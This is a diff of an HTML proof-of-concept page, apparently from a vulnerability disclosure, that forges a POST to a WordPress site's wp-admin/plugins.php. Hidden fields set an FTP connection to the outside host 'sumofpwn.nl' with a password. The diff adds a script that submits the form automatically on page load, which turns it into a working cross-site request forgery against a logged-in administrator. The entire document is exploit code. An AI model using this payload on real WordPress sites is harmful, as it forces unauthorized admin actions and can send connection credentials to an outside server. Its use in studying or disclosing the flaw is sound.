@@ -1,10 +1,13 @@
 <html>
    <body>
-      <form action="http://wpdistillery.vm/wp-admin/plugins.php" method="POST">
+      <form name="csrfForm" action="http://wpdistillery.vm/wp-admin/plugins.php" method="POST">
          <input type="hidden" name="hostname" value="sumofpwn.nl" />
          <input type="hidden" name="connection_type" value="ftp" />
          <input type="hidden" name="password" value="password" />
          <input type="submit" value="Submit request" />
       </form>
+      <script>
+         document.csrfForm.submit();
+      </script>
    </body>
 </html>
